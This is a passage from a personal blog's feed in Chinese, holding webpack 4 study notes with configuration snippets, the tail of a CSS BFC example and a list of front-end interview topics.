width: 100px;</span><br><span class="line">      background: green;</span><br><span class="line">      float: left;</span><br><span class="line">    &#125;</span><br><span class="line">    .bfc &#123;</span><br><span class="line">      overflow: hidden;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;div class=&quot;container&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;floated&quot;&gt;浮动的div&lt;/div&gt;</span><br><span class="line">    &lt;p class=&quot;bfc&quot;&gt;</span><br><span class="line">    我们是社会主义接班人 我们是社会主义接班人 我们是社会主义接班人</span><br><span class="line">    我们是社会主义接班人 我们是社会主义接班人 我们是社会主义接班人</span><br><span class="line">    我们是社会主义接班人 我们是社会主义接班人 我们是社会主义接班人</span><br><span class="line">    &lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">// 不加上 bfc class 文字将围绕在浮动的 div 周围，加上 bfc class 之后 文字将不会环绕</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;BFC&quot;&gt;&lt;a href=&quot;#BFC&quot; class=&quot;headerlink&quot; title=&quot;BFC&quot;&gt;&lt;/a&gt;BFC&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;BFC(Block Formatting Context)是 Web 页面中盒模型布局的 CSS 渲染模式
      
    
    </summary>
    
      <category term="CSS" scheme="https://fuzhongfeng.github.io/categories/CSS/"/>
    
    
      <category term="CSS" scheme="https://fuzhongfeng.github.io/tags/CSS/"/>
    
  </entry>
  
  <entry>
    <title>Webpack4</title>
    <link href="https://fuzhongfeng.github.io/2019/01/24/2019-1-28-webpack/"/>
    <id>https://fuzhongfeng.github.io/2019/01/24/2019-1-28-webpack/</id>
    <published>2019-01-24T09:47:10.000Z</published>
    <updated>2022-01-26T13:14:14.065Z</updated>
    
    <content type="html"><![CDATA[<h1 id="webpack-学习笔记"><a href="#webpack-学习笔记" class="headerlink" title="webpack 学习笔记"></a>webpack 学习笔记</h1><h2 id="Html-插件"><a href="#Html-插件" class="headerlink" title="Html 插件"></a>Html 插件</h2><ol><li>根据模板在打包时自动生成 html 文件，使用 htmlWebpackPlugin 插件可以配置入口 html 模板和在引入的 js 文件上加 hash</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// 第一种</span><br><span class="line">plugins: [</span><br><span class="line">    new HtmlWebpackPlugin(&#123;</span><br><span class="line">        template: &apos;./src/index.html&apos;,</span><br><span class="line">        filename: &apos;index.html&apos;,</span><br><span class="line">        minify: &#123; // 将 build 后的 html 文件压缩</span><br><span class="line">            collapseWhiteSpace: true,</span><br><span class="line">        &#125;,</span><br><span class="line">        hash: true // 在 html 的 script 标签引入的 js 中加 hash，如: &quot;build.js?0b2a9l&quot; 防止缓存</span><br><span class="line">    &#125;)</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">// 第二种在 output 中配置</span><br><span class="line">output: &#123;</span><br><span class="line">    filename: &apos;bundle.[hash:8].js&apos; // 此方法每次回生成不同的文件防止缓存，但实际使用中也会出现一定的问题，如上线之后用户会出现访问不到文件的 404 的情况</span><br><span class="line">    // &apos;bundle.js?[hash:8]&apos; 可以防止缓存，又可以避免上线之后用户浏览器缓存引起的文件 404 的情况</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>webpack-dev-server 生成一个内存中的打包文件</li></ol><h2 id="webpack-dev-server"><a href="#webpack-dev-server" class="headerlink" title="webpack-dev-server"></a>webpack-dev-server</h2><p>webpack 是内置的通过 express 启动的静态服务，好处是并不会真是的打包文件，而是在内存中打包，并生成一个本地地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 开发服务器的配置</span><br><span class="line">devServer: &#123;</span><br><span class="line">    port: 3000, // 开发服务本地端口</span><br><span class="line">    progress: true, // 添加进度条</span><br><span class="line">    contentBase: &apos;./build&apos;, // 指定 build 作为静态服务</span><br><span class="line">    open: true, // 自动打开网页</span><br><span class="line">    compress: true, // 压缩</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="webpack-跨域问题"><a href="#webpack-跨域问题" class="headerlink" title="webpack 跨域问题"></a>webpack 跨域问题</h2><ol><li>使用 webpack-dev-server 解决，当前端出现跨域时可以通过 node 服务来进行转发</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">devServer: &#123;</span><br><span class="line">    //(1) 通过重写的方式 把请求代理到 express 服务器上, 配置了一个代理，将 api 的请求转发到 3000</span><br><span class="line">    proxy: &#123;</span><br><span class="line">        &apos;/api&apos;: &#123;</span><br><span class="line">            target: &apos;http://localhost:3000&apos;,</span><br><span class="line">            pathRewrite: &#123;</span><br><span class="line">                &apos;/api&apos;: &apos;&apos;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //(2) 前端只想单纯来模拟数据</span><br><span class="line">    before() &#123;</span><br><span class="line">        app.get(&apos;/user&apos;, (req. res) =&gt; &#123;</span><br><span class="line">            res.json(&#123;</span><br><span class="line">                name: &apos;mock 数据&apos;</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//(3) 有服务端，不用代理来处理 ，在服务端启动 webpack 端口用服务端端口</span><br><span class="line">// server.js 文件</span><br><span class="line">// 使用 webpack-dev-middleware 在服务端启动 webpack</span><br><span class="line">let middle = require(&apos;webpack-dev-middleware&apos;)</span><br><span class="line">let config = require(&apos;webpack.config.js&apos;)</span><br><span class="line">let webpack = require(&apos;webpack&apos;)</span><br><span class="line">let compiler = webpack(config)</span><br><span class="line">app.use(middle(compiler))</span><br></pre></td></tr></table></figure><h2 id="loader"><a href="#loader" class="headerlink" title="loader"></a>loader</h2><ol><li>loader 默认从右向做、从下到上处理</li><li>style-loader: 将 style 中的 css 变成 link 方式引入，避免阻塞</li><li>css-loader: 可以支持 css import 语法</li><li>less-loader: 可以将 less 转为 css</li><li>pre loader、内联 loader（直接可以再代码中使用的）、normal loader、后置 postloader</li></ol><h2 id="es-语法转换"><a href="#es-语法转换" class="headerlink" title="es 语法转换"></a>es 语法转换</h2><ol><li>babel-loader babel/core babel/preset-env</li></ol><h2 id="处理-js-语法和校验"><a href="#处理-js-语法和校验" class="headerlink" title="处理 js 语法和校验"></a>处理 js 语法和校验</h2><p>babel/polyfill<br>loader 默认从右向做、从下到上处理，如果不考数组顺序可以按照如下方式指定:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">rules: [</span><br><span class="line">    use: &#123;</span><br><span class="line">        loader: &apos;eslint-loader&apos;</span><br><span class="line">        options: &#123;</span><br><span class="line">            enforce: &apos;pre&apos;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>eslint-loader 需要先于其他 loader 执行</p><h2 id="全局变量的引入"><a href="#全局变量的引入" class="headerlink" title="全局变量的引入"></a>全局变量的引入</h2><ol><li>将 jquery 挂在到全局需要使用 ‘expose-loader’ 暴露全局的 loader 属于内联 loader。<br>将 jquery 暴露到 window.\$ 上</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 内联写法</span><br><span class="line">import $ from &apos;expose-loader?$!jquery&apos; jquery</span><br><span class="line"></span><br><span class="line">// rules 写法</span><br><span class="line">rules: [</span><br><span class="line">    test: require.resolve(&apos;jquery&apos;),</span><br><span class="line">    use: &apos;expose-loader?$&apos;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><ol start="2"><li>可以使用 ProvidePlugin 给每个模块都提供 \$</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 在每个模块中都注$，可以直接在代码中使用 $</span><br><span class="line">webpack.ProvidePlugin(&#123;</span><br><span class="line">    $: &apos;jquery&apos;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><ol start="3"><li>如果写法如下: <code>import $ from &#39;jquery&#39;</code>, 则在打包的时候会将 jquery 打包到 bundle 中，如果想再打包时忽略掉（需要在 html 模板中引入 jquery cdn），则需要如下配置</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 引入不打包</span><br><span class="line">externals: &#123;</span><br><span class="line">    jquery: &apos;jQuery&apos;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="dllPlugin"><a href="#dllPlugin" class="headerlink" title="dllPlugin"></a>dllPlugin</h2><ol><li>把公共的文件(如 react react-dom)提取出来打包成静态文件生成 manifest.json。而不是将打包到文件中从而可以减少打包后文件的大小，需要手动在 index.html 模板中引入，通过 DllReferencePlugin 来声明引入时先从 manifest 文件中查找</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">// 需要单独建一个配置文件如 webpack.config.react.js</span><br><span class="line">var webpack = require(&apos;webpack&apos;)</span><br><span class="line">module.exports = &#123;</span><br><span class="line">    mode: &apos;development&apos;,</span><br><span class="line">    entry: &#123;</span><br><span class="line">        react: [&apos;react&apos;, &apos;react-dom&apos;],</span><br><span class="line">    &#125;,</span><br><span class="line">    output: &#123;</span><br><span class="line">        filename: &apos;_dll_[name]&apos;.js, // 产生文件名</span><br><span class="line">        path: path.resolve(__dirname, &apos;dist&apos;),</span><br><span class="line">        library: &apos;_dll_[name]&apos;, // _dll_react</span><br><span class="line">    &#125;,</span><br><span class="line">    plugins: [</span><br><span class="line">        new webpack.DllPlugin(&#123;</span><br><span class="line">            name: &apos;_dll_[name]&apos;, // 同 library</span><br><span class="line">            path: path.resolve(__dirname, &apos;dist&apos;, &apos;manifest.json&apos;)</span><br><span class="line">        &#125;)</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 引入时指定</span><br><span class="line">plugins: [</span><br><span class="line">    new webpack.DllReferencePlugin(&#123;</span><br><span class="line">        manifest: path.resolve(__dirname, &apos;dist&apos;, &apos;manifest.json&apos;)</span><br><span class="line">    &#125;)</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">// index.html</span><br><span class="line">&lt;script src=&quot;/_dll_react.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="EJS"><a href="#EJS" class="headerlink" title="EJS"></a>EJS</h2><p>简单的模板语言可以用 JS 编写 HTML 页面</p><h2 id="图片处理"><a href="#图片处理" class="headerlink" title="图片处理"></a>图片处理</h2><p>webpack 中如何打包图片</p><ul><li>在 js 文件中可以通过 import 把图片引入，返回的结果是一张新的图片地址，然而 webpack 会报错，此时需要 loader 处理：file-loader 默认会在内部生成一张图片放到 build 目录下，把生成的图片的名字返回来</li><li>在 css 中的图片可以直接使用，因为 css-loader 已经处理</li><li>img 标签中的图片需要通过其他 loader 处理：html-withimg-loader 可以解析 html 编译图片</li><li>体积较小的图片考虑到少发 http 请求的情况下可以处理成 base64，可以使用：url-loader</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">module: &#123;</span><br><span class="line">    rules: [</span><br><span class="line">        &#123;</span><br><span class="line">            test: /\.(png|jpg|gif)$/,</span><br><span class="line">            use: &#123;</span><br><span class="line">                loader: &apos;url-loader&apos;,</span><br><span class="line">                options: &#123;</span><br><span class="line">                    limit: 200 * 1024, // 限制小于改值时用 base64 转化，否则使用 file-loader 产生真实的图片</span><br><span class="line">                    outputPath: &apos;img/&apos; // 图片编译到指定的输出目录</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="cleanWebpackPlugin"><a href="#cleanWebpackPlugin" class="headerlink" title="cleanWebpackPlugin"></a>cleanWebpackPlugin</h2><p>可以在每次打包前将输出的目录清空</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">plugins: [</span><br><span class="line">    new CleanWebpackPlugin(&apos;./dist&apos;)</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h2 id="copyWebpackPlugin"><a href="#copyWebpackPlugin" class="headerlink" title="copyWebpackPlugin"></a>copyWebpackPlugin</h2><p>可以将指定的文件或文件夹拷贝</p><h2 id="bannerPlugin-webpack-内置"><a href="#bannerPlugin-webpack-内置" class="headerlink" title="bannerPlugin(webpack 内置)"></a>bannerPlugin(webpack 内置)</h2><p>在代码编译后添加版权声明，在编译后的代码头部添加注释 /<em>make 2019 by fuzhongfeng</em>/</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">plugins: [</span><br><span class="line">    new webpack.BannerPlugin(&apos;make 2019 by fuzhongfeng&apos;)</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h2 id="resolve"><a href="#resolve" class="headerlink" title="resolve"></a>resolve</h2><p>解析第三方包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">resolve: &#123;</span><br><span class="line">    modules: [path.resolve(&apos;node_modules&apos;)], // 指定只在当前目录下查找 node_modules</span><br><span class="line">    alias: &#123;</span><br><span class="line">        bootstrap: &apos;bootstrap/dist/css/bootstrap.css&apos; // 别名</span><br><span class="line">    &#125;,</span><br><span class="line">    mainFields: [&apos;style&apos;, &apos;main&apos;], // 指定在 node_modules 中的包查找的顺序</span><br><span class="line">    mainFiles: [], // 入口文件的名字 index.js</span><br><span class="line">    extensions: [&apos;.js&apos;, &apos;.css&apos;, &apos;.json&apos;, &apos;.vue&apos;] // 在引入文件时，可以按照数组中指定后缀名来解析文件，可以不用书写后缀名</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="webpack-DefinePlugin"><a href="#webpack-DefinePlugin" class="headerlink" title="webpack.DefinePlugin"></a>webpack.DefinePlugin</h2><p>webpack 内置插件定义环境变量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">plugins: [</span><br><span class="line">    new webpack.DefinePlugin(&#123;</span><br><span class="line">        DEV: JSON.stringify(&apos;dev&apos;) // 可在全局获取 DEV 变量，dev 一定需要在外层包裹引号，所以使用 stringify 方法</span><br><span class="line">    &#125;)</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h2 id="noParse"><a href="#noParse" class="headerlink" title="noParse"></a>noParse</h2><p>不去解析第三方包的依赖关系</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">module.exports = &#123;</span><br><span class="line">  module: &#123;</span><br><span class="line">    noParse: /jquery|lodash/,</span><br><span class="line">    noParse: (content) =&gt; /jquery|lodash/.test(content)</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="webpack-IgnorePlugin"><a href="#webpack-IgnorePlugin" class="headerlink" title="webpack.IgnorePlugin"></a>webpack.IgnorePlugin</h2><p>如 moment 中的语言包可以通过此插件忽略然后手动引入所需要的语言包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">plugins: [</span><br><span class="line">    new webpack.IgnorePlugin(/\.\/locale/, /moment/)</span><br><span class="line">]</span><br><span class="line">// 手动引入语言包</span><br><span class="line">import &apos;moment/locale/zh-cn&apos;</span><br></pre></td></tr></table></figure><h2 id="Happypack"><a href="#Happypack" class="headerlink" title="Happypack"></a>Happypack</h2><p>可以实现多线程打包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">module: &#123;</span><br><span class="line">    rules: [</span><br><span class="line">        &#123;</span><br><span class="line">            test: /\.js$/,</span><br><span class="line">            use: &apos;Happypack/loader?id=js&apos;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            test: /\.css$/,</span><br><span class="line">            use: &apos;Happypack/loader?id=css&apos;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">plugins: [</span><br><span class="line">    new Happypack(&#123;</span><br><span class="line">        id: &apos;js&apos;,</span><br><span class="line">        use: [</span><br><span class="line">            &#123;</span><br><span class="line">                loader: &apos;babel-loader&apos;,</span><br><span class="line">                options: &#123;</span><br><span class="line">                    presents: [</span><br><span class="line">                        &apos;@babel/present-env&apos;,</span><br><span class="line">                        &apos;@babel/present-react&apos;</span><br><span class="line">                    ]</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;),</span><br><span class="line">    new Happypack(&#123;</span><br><span class="line">        id: &apos;css&apos;,</span><br><span class="line">        use: [&apos;style-loader&apos;, &apos;css-loader&apos;]</span><br><span class="line">    &#125;)</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h2 id="webpack-自带优化"><a href="#webpack-自带优化" class="headerlink" title="webpack 自带优化"></a>webpack 自带优化</h2><ul><li>import 在生产环境下会自动去除掉没用的代码，所谓的 ‘tree-shaking’</li><li>es6 模块会把结果默认放到 default 上</li><li>scope hosting 作用域提升，在 webpack 中自动省略一些可以简化的代码，如：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// 编译前：</span><br><span class="line">let a = 1;</span><br><span class="line">let b = 2;</span><br><span class="line">let c = 3;</span><br><span class="line">console.log(a + b + c, &apos;---&apos;)</span><br><span class="line">// 编译后：</span><br><span class="line">console.log(6, &apos;---&apos;)</span><br></pre></td></tr></table></figure></li></ul><h2 id="抽取公共代码-多页"><a href="#抽取公共代码-多页" class="headerlink" title="抽取公共代码(多页)"></a>抽取公共代码(多页)</h2><p>在多页应用项目中可以抽取公共文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">// webpack4 之前可使用 commonChunkPlugin</span><br><span class="line">// webpack 4 配置如下：</span><br><span class="line">optimization: &#123;</span><br><span class="line">    splitChunks: &#123; // 分割代码块</span><br><span class="line">        cacheGroups: &#123; // 缓存组</span><br><span class="line">            commons: &#123; // 公共的模块</span><br><span class="line">                chunks: &apos;initial&apos;, // 从入口开始</span><br><span class="line">                minSize: 10, // 文件的最体积</span><br><span class="line">                minChunks: 2, // 被引用的最小次数</span><br><span class="line">            &#125;,</span><br><span class="line">            vendor: &#123; // 第三方依赖抽离</span><br><span class="line">                priority: 1, // 指定优先级，先将第三方一来抽离，再进行公共的模块抽离</span><br><span class="line">                test: /node_modules/, // 指定正则需要抽离的文件夹</span><br><span class="line">                chunks: &apos;initial&apos;,</span><br><span class="line">                minSize: 10,</span><br><span class="line">                minChunks: 2,</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">// 如果指定 priority 参数则会先将不同模块中使用的第三方库如 $ 抽离为公共模块 common, 会导 $ 多次被打包到业务代码模块中</span><br></pre></td></tr></table></figure></p><h2 id="代码分割和懒加载-单页"><a href="#代码分割和懒加载-单页" class="headerlink" title="代码分割和懒加载(单页)"></a>代码分割和懒加载(单页)</h2><ol><li><p>require.ensure() 是 webpack 内置语法并将被 import() 取代，可以实现动态加载</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">require.ensure(</span><br><span class="line">  [&quot;./subPageA.js&quot;, &quot;./subPageB.js&quot;],</span><br><span class="line">  function() &#123;</span><br><span class="line">    // 需要再次引入</span><br><span class="line">    var subPageA = require(&quot;./subPageA&quot;);</span><br><span class="line">    var subPageB = require(&quot;./subPageB&quot;);</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;subPage&quot; // chunkName</span><br><span class="line">);</span><br></pre></td></tr></table></figure></li><li><p>import() 为官方推荐写法，可以实现动态加载</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import(</span><br><span class="line">  /* webpackInclude: /\.json$/ */</span><br><span class="line">  /* webpackExclude: /\.noimport\.json$/ */</span><br><span class="line">  /* webpackChunkName: &quot;my-chunk-name&quot; */</span><br><span class="line">  /* webpackMode: &quot;lazy&quot; */</span><br><span class="line">  /* webpackPrefetch: true */ </span><br><span class="line">  /* webpackPreload: true */</span><br><span class="line">  `./locale/$&#123;language&#125;`</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">import(/* webpackChunkName: &apos;subPageA&apos;*/ &quot;./subPageA&quot;).then(function(subPageA) &#123;</span><br><span class="line">  console.log(subPageA);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">import(/* webpackChunkName: &apos;subPageB&apos;*/ &quot;./subPageB&quot;).then(function(subPageB) &#123;</span><br><span class="line">  console.log(subPageB);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">import(/* webpackChunkName: &apos;lodash&apos;*/ &quot;lodash&quot;).then(function(_) &#123;</span><br><span class="line">  console.log(_.join([&quot;1&quot;, &quot;2&quot;]));</span><br><span class="line">&#125;);</span><br><span class="line">// Chunk Names: vendors^lodash subPageA subPageB</span><br></pre></td></tr></table></figure></li></ol><h2 id="source-map"><a href="#source-map" class="headerlink" title="source map"></a>source map</h2><ol><li>source map 文件在浏览器 network 中默认是不会显示的，但通过 charles - macOS Proxy 是可以看到的</li><li>source map 文件如果不打开浏览器控制台是不会加载的，如通过 charles 对 h5 抓包时是看不到的。</li><li>source map 文件对应的源文件是中存在对应的标识，如：app.c445cac8.js 文件底部有sourceMappingURL=app.c445cac8.js.map 标识</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;webpack-学习笔记&quot;&gt;&lt;a href=&quot;#webpack-学习笔记&quot; class=&quot;headerlink&quot; title=&quot;webpack 学习笔记&quot;&gt;&lt;/a&gt;webpack 学习笔记&lt;/h1&gt;&lt;h2 id=&quot;Html-插件&quot;&gt;&lt;a href=&quot;#Html-插
      
    
    </summary>
    
      <category term="Webpack" scheme="https://fuzhongfeng.github.io/categories/Webpack/"/>
    
    
      <category term="Webpack" scheme="https://fuzhongfeng.github.io/tags/Webpack/"/>
    
  </entry>
  
  <entry>
    <title>Front-end-base</title>
    <link href="https://fuzhongfeng.github.io/2019/01/12/2019-1-12-front-end-base/"/>
    <id>https://fuzhongfeng.github.io/2019/01/12/2019-1-12-front-end-base/</id>
    <published>2019-01-12T14:06:13.000Z</published>
    <updated>2022-01-23T12:24:24.010Z</updated>
    
    <content type="html"><![CDATA[<h2 id="HTTP，HTML和浏览器"><a href="#HTTP，HTML和浏览器" class="headerlink" title="HTTP，HTML和浏览器"></a>HTTP，HTML和浏览器</h2><ul><li>DOM 事件类型和事件流</li><li>浏览器的缓存，cookie，sessionStorage，localStorage</li><li>浏览器的单线程机制</li><li>HTML5的某个API，例如：drag，mouse</li></ul><h2 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h2><ul><li>盒模型</li><li>常用布局方式</li><li>BFC</li><li>针对某一个具体的 CSS 样式，问具体的使用方法和使用场景。例如：border 这个样式，值的具体类型，值为百分比和值为数字的区别，具体的使用场景，和 ouline 的区别等。</li></ul><h3 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h3><blockquote><p>原型与原型链<br>    <strong>原型</strong>：每一个构造函数都有一个prototype属性，指向另一个对象。这个对象的所有属性和方法，都会被构造函数的实例继承。<br>    <strong>原型链</strong>：访问一个对象的属性时，先在其基本属性中查找，如果没有再沿着<strong>proto</strong>这条链向上找，这就是原型链。<br>    <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Object</span>.prototype.__proto__ === <span class="literal">null</span></span><br></pre></td></tr></table></figure></p></blockquote><hr><ul><li>异步回调</li><li>ES6/7</li><li>跨域</li><li>前端模块化<blockquote><p>Event Loop</p><ol><li>所有同步任都在主线程上执行，形成一个执行栈</li><li>只要异步任务有了运行结果，就在任务队列中放置一个事件。</li><li>一旦执行栈中的所有同步任务执行完毕，就会读取任务队列，异步任务进入执行栈开始执行</li><li>主线程不断重复上面的第 3 步</li></ol></blockquote></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 